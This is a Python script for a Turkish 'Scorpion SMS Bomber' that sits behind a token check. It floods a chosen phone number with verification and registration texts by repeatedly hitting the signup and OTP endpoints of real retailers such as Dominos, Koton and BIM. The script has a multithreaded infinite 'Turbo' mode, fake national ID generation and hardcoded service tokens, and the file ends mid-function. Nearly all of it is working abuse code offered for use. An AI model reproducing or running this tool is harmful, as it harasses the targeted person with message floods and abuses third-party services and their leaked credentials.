import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style, Back
from time import sleep
from os import system
import threading
import sys

class TokenManager:
    def __init__(self):
        self.token_url = "https://scorpion292439.github.io/scorpion-sms-bomber/"
        self.verify_url = "https://ipchecer-default-rtdb.firebaseio.com/tokens.json"
        self.token = None
   
    def get_token_from_user(self):
        system("clear")
        print(f"""
{Fore.RED + Style.BRIGHT}
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║ ║
    ║ TOKEN DOĞRULAMA SİSTEMİ ║
    ║ ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
       
        print(f"{Fore.YELLOW + Style.BRIGHT}🔐 Token Yok! Lütfen aşağıdaki adresten token alın:{Style.RESET_ALL}")
        print(f"{Fore.CYAN + Style.BRIGHT}🌐 Site: {self.token_url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW + Style.BRIGHT}📝 Token: {Fore.GREEN}", end="")
        token = input().strip()
       
        if self.verify_token(token):
            self.token = token
            print(f"{Fore.GREEN + Style.BRIGHT}✅ Token doğrulandı! Scorpion SMS Bomber başlatılıyor...{Style.RESET_ALL}")
            sleep(2)
            return True
        else:
            print(f"{Fore.RED + Style.BRIGHT}❌ Geçersiz token! Lütfen doğru tokeni girin.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW + Style.BRIGHT}🔑 Yeni token almak için: {self.token_url}{Style.RESET_ALL}")
            sleep(3)
            return False
   
    def verify_token(self, token):
        try:
            response = requests.get(self.verify_url, timeout=10)
            if response.status_code == 200:
                tokens_data = response.json()
                if tokens_data:
                    for key, data in tokens_data.items():
                        if data.get('token') == token:
                            print(f"{Fore.GREEN + Style.BRIGHT}👤 Hoş geldiniz: {data.get('email', 'Kullanıcı')}{Style.RESET_ALL}")
                            return True
            return False
        except Exception as e:
            print(f"{Fore.RED + Style.BRIGHT}⚠️ Token doğrulama hatası: {str(e)}{Style.RESET_ALL}")
            return False

class SendSms():
    adet = 0
 
    def __init__(self, phone, mail):
        print(f"{Fore.RED + Style.BRIGHT}🦂 {Style.RESET_ALL}{Fore.YELLOW + Style.BRIGHT}Scorpion Strike Initialized! Target Locked: {Fore.GREEN + Style.BRIGHT}{phone}{Style.RESET_ALL}")
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"
    #kahvedunyasi.com
    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json={"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["processStatus"] == "Success":
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.kahvedunyasi.com{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.kahvedunyasi.com{Style.RESET_ALL}")
     
    #bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone": self.phone}, timeout=6)
            if bim.status_code == 200:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}bim.veesk.net{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}bim.veesk.net{Style.RESET_ALL}")
       
    #evidea.com
    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 202:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}evidea.com{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}evidea.com{Style.RESET_ALL}")
    #naosstars.com
    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul", "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
            json={"telephone": f"+90{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.naosstars.com{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.naosstars.com{Style.RESET_ALL}")
    #koton.com
    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "X-Project-Name": "rn-env", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.koton.com/", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"}
            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 202:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}koton.com{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}koton.com{Style.RESET_ALL}")
    #metro-tr.com
    def Metro(self):
        try:
            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate, br", "Applicationversion": "2.4.1", "Applicationplatform": "2", "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
            json={"methodType": "2", "mobilePhoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["status"] == "success":
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}mobile.metro-tr.com{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}mobile.metro-tr.com{Style.RESET_ALL}")
    #file.com.tr
    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json={"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.filemarket.com.tr{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.filemarket.com.tr{Style.RESET_ALL}")
         
    #komagene.com.tr
    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
            json={"FirmaId": 32, "Telefon": self.phone}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.komagene.com.tr/", "Anonymousclientid": "0dbf392b-ab10-48b3-5cda-31f3c19816e6", "Firmaid": "32", "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq", "Content-Type": "application/json", "Origin": "https://www.komagene.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json()["Success"] == True:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}gateway.komagene.com{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}gateway.komagene.com{Style.RESET_ALL}")
 
    #porty.tech
    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json={"job": "start_login", "phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers, timeout=6)
            if r.json()["status"]== "success":
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}panel.porty.tech{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}panel.porty.tech{Style.RESET_ALL}")
    #dominos.com.tr
    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            headers = {"Content-Type": "application/json;charset=utf-8", "Accept": "application/json, text/plain, */*", "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", "Appversion": "IOS-7.1.0", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Servicetype": "CarryOut", "Locationcode": "undefined"}
            json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}frontend.dominos.com.tr{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}frontend.dominos.com.tr{Style.RESET_ALL}")

def print_main_banner():
    banner = f"""
{Fore.RED + Style.BRIGHT}
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║ ║
    ║                          SCORPION TOOLKIT                          ║
    ║ ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
{Fore.YELLOW + Style.BRIGHT} v2.0 | Powered by {Fore.RED + Style.BRIGHT}Scorpion{Fore.YELLOW + Style.BRIGHT} | Termux Edition
{Fore.GREEN + Style.BRIGHT} Token Doğrulama Sistemi Aktif
{Style.RESET_ALL}
"""
    print(banner)

def print_sms_banner():
    banner = f"""
{Fore.RED + Style.BRIGHT}
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║ ║
    ║ ██████╗██╗██████╗ ██╗ ██╗██╗ ██╗███████╗███╗ ███╗ ██████╗ ██╗██████╗ ║
    ║ ██╔══██╗██║██╔══██╗██║ ██║██║ ██╔╝██╔════╝████╗ ████║██╔═══██╗██║██╔══██╗ ║
    ║ ██████╔╝██║██████╔╝██║ █╗ ██║█████╔╝ █████╗ ██╔████╔██║██║ ██║██║██████╔╝ ║
    ║ ██╔══██╗██║██╔══██╗██║███╗██║██╔═██╗ ██╔══╝ ██║╚██╔╝██║██║ ██║██║██╔══██╗ ║
    ║ ██║ ██║██║██║ ██║╚███╔███╔╝██║ ██╗███████╗██║ ╚═╝ ██║╚██████╔╝██║██████╔╝ ║
    ║ ╚═╝ ╚═╝╚═╝╚═╝ ╚═╝ ╚══╝╚══╝ ╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╚═════╝ ╚═╝╚═════╝ ║
    ║ ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
{Fore.YELLOW + Style.BRIGHT} SMS Bomber v2.0 | Powered by {Fore.RED + Style.BRIGHT}Scorpion{Fore.YELLOW + Style.BRIGHT} | Termux Edition
{Style.RESET_ALL}
"""
    print(banner)

def sms_bomber_menu(token_manager):
    servisler_sms = []
    for attribute in dir(SendSms):
        attribute_value = getattr(SendSms, attribute)
        if callable(attribute_value):
            if attribute.startswith('__') == False:
                servisler_sms.append(attribute)
    
    while True:
        system("clear")
        print_sms_banner()
        try:
            menu = input(f"{Fore.MAGENTA + Style.BRIGHT + Back.BLACK}╔═[ {Fore.WHITE}SCORPION SMS BOMBER MENU{Fore.MAGENTA} ]═╗{Style.RESET_ALL}\n"
                         f"{Fore.CYAN + Style.BRIGHT}║{Fore.WHITE} 1. {Fore.GREEN}SMS Gönder (Normal Mode){Fore.WHITE} ║{Style.RESET_ALL}\n"
                         f"{Fore.CYAN}║{Fore.WHITE} 2. {Fore.GREEN}SMS Gönder (Turbo Mode){Fore.WHITE} ║{Style.RESET_ALL}\n"
                         f"{Fore.CYAN}║{Fore.WHITE} 3. {Fore.RED}Geri Dön / Back{Fore.WHITE} ║{Style.RESET_ALL}\n"
                         f"{Fore.MAGENTA + Style.BRIGHT}╚{'═' * 48}╝{Style.RESET_ALL}\n\n"
                         f"{Fore.YELLOW + Style.BRIGHT}Seçimini Yap / Choose: {Fore.GREEN}")
            if menu == "":
                continue
            menu = int(menu)
        except ValueError:
            print(f"{Fore.RED + Style.BRIGHT}❌ Hatalı Giriş! Lütfen Sayı Giriniz. / Invalid Input! Please Enter a Number.{Style.RESET_ALL}")
            sleep(3)
            continue
        
        if menu == 1:
            system("clear")
            print_sms_banner()
            print(f"{Fore.YELLOW + Style.BRIGHT}📱 Telefon Numarası (+90 Olmadan, Birden Fazla İçin Enter Bas): {Fore.GREEN}", end="")
            tel_no = input()
            tel_liste = []
            sonsuz = ""
            if tel_no == "":
                print(f"{Fore.YELLOW}📁 Dosya Dizinini Gir: {Fore.GREEN}", end="")
                dizin = input()
                try:
                    with open(dizin, "r", encoding="utf-8") as f:
                        for i in f.read().strip().split("\n"):
                            if len(i) == 10:
                                tel_liste.append(i)
                    sonsuz = "(Sonsuz İçin Enter Bas / Infinite: Enter)"
                except FileNotFoundError:
                    print(f"{Fore.RED + Style.BRIGHT}❌ Dosya Bulunamadı! / File Not Found!{Style.RESET_ALL}")
                    sleep(3)
                    continue
            else:
                try:
                    int(tel_no)
                    if len(tel_no) != 10:
                        raise ValueError
                    tel_liste.append(tel_no)
                    sonsuz = "(Sonsuz İçin Enter Bas / Infinite: Enter)"
                except ValueError:
                    print(f"{Fore.RED + Style.BRIGHT}❌ Geçersiz Numara! / Invalid Number!{Style.RESET_ALL}")
                    sleep(3)
                    continue
           
            print(f"{Fore.YELLOW + Style.BRIGHT}📧 E-posta Adresi (Bilmiyorsan Enter): {Fore.GREEN}", end="")
            mail = input()
            if mail and ("@" not in mail or ".com" not in mail):
                print(f"{Fore.RED + Style.BRIGHT}❌ Geçersiz E-posta! / Invalid Email!{Style.RESET_ALL}")
                sleep(3)
                continue
           
            print(f"{Fore.YELLOW + Style.BRIGHT}📤 Kaç SMS? {sonsuz}: {Fore.GREEN}", end="")
            kere_input = input()
            if kere_input:
                try:
                    kere = int(kere_input)
                except ValueError:
                    print(f"{Fore.RED + Style.BRIGHT}❌ Hatalı Sayı! / Invalid Number!{Style.RESET_ALL}")
                    sleep(3)
                    continue
            else:
                kere = None
           
            print(f"{Fore.YELLOW + Style.BRIGHT}⏱️ Saniye Aralığı: {Fore.GREEN}", end="")
            try:
                aralik = int(input())
            except ValueError:
                print(f"{Fore.RED + Style.BRIGHT}❌ Hatalı Sayı! / Invalid Number!{Style.RESET_ALL}")
                sleep(3)
                continue
           
            print(f"{Fore.CYAN + Style.BRIGHT}🚀 Gönderim Başlatılıyor... / Sending Started...{Style.RESET_ALL}")
           
            if kere is None and len(tel_liste) == 1:
                sms = SendSms(tel_liste[0], mail)
                while True:
                    for attribute in servisler_sms:
                        exec(f"sms.{attribute}()")
                        sleep(aralik)
            else:
                for i in tel_liste:
                    sms = SendSms(i, mail)
                    if isinstance(kere, int):
                        while sms.adet < kere:
                            for attribute in servisler_sms:
                                if sms.adet >= kere:
                                    break
                                exec(f"sms.{attribute}()")
                                sleep(aralik)
           
            print(f"{Fore.GREEN + Style.BRIGHT}✅ Tamamlandı! Menüye Dönmek İçin Enter... / Completed! Enter to Menu...{Style.RESET_ALL}")
            input()
       
        elif menu == 2:
            system("clear")
            print_sms_banner()
            print(f"{Fore.YELLOW + Style.BRIGHT}📱 Telefon Numarası (+90 Olmadan): {Fore.GREEN}", end="")
            tel_no = input()
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
            except ValueError:
                print(f"{Fore.RED + Style.BRIGHT}❌ Geçersiz Numara! / Invalid Number!{Style.RESET_ALL}")
                sleep(3)
                continue
           
            print(f"{Fore.YELLOW + Style.BRIGHT}📧 E-posta Adresi (Bilmiyorsan Enter): {Fore.GREEN}", end="")
            mail = input()
            if mail and ("@" not in mail or ".com" not in mail):
                print(f"{Fore.RED + Style.BRIGHT}❌ Geçersiz E-posta! / Invalid Email!{Style.RESET_ALL}")
                sleep(3)
                continue
           
            print(f"{Fore.CYAN + Style.BRIGHT}⚡ Turbo Modu Başlatılıyor... / Turbo Mode Started...{Style.RESET_ALL}")
            send_sms = SendSms(tel_no, mail)
            dur = threading.Event()
           
            def Turbo():
                while not dur.is_set():
                    threads = []
                    for fonk in servisler_sms:
                        t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
                        threads.append(t)
                        t.start()
                    for t in threads:
                        t.join()
           
            try:
                Turbo()
            except KeyboardInterrupt:
                dur.set()
                print(f"{Fore.YELLOW + Style.BRIGHT}⏹️ Durduruldu! Menüye Dönülüyor... / Stopped! Returning to Menu...{Style.RESET_ALL}")
                sleep(2)
       
        elif menu == 3:
            break

def main():
    # Token kontrolü en başta
    token_manager = TokenManager()
    while token_manager.token is None:
        if not token_manager.get_token_from_user():
            continue
        else:
            break
   
    while True:
        system("clear")
        print_main_banner()
        try:
